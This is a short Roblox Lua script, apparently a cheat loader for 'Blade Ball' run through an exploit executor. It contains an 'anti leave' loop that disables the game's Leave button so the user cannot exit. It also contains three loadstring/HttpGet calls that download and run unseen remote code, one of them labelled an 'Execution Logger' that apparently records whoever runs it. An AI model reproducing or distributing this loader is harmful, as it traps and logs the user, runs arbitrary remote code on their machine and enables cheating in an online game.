-- Anti Leave Script
task.spawn(function()
    while task.wait() do
        pcall(function()
            for _, v in ipairs(getconnections(
                game:GetService("CoreGui")
                    .RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated
            )) do
                v:Disable()
            end
        end)
    end
end)

-- Script Source
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/cxzyue/Blade-Ball/refs/heads/main/SilogXRealSource.lua"))()
end)

-- Execution Logger
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/cxzyue/Blade-Ball/refs/heads/main/Logger.lua"))()
end)

wait(1.5)

-- Script link
task.spawn(function()
    loadstring(game:HttpGet("https://xscripts.cc/cse0daX1rLANfdjBtjaGsgh7pkXHjnjZ3xkkMdMbovDCSUXrI7uDgUcfwW82NwomeI9xMxNRDChGn9j4"))()
end)
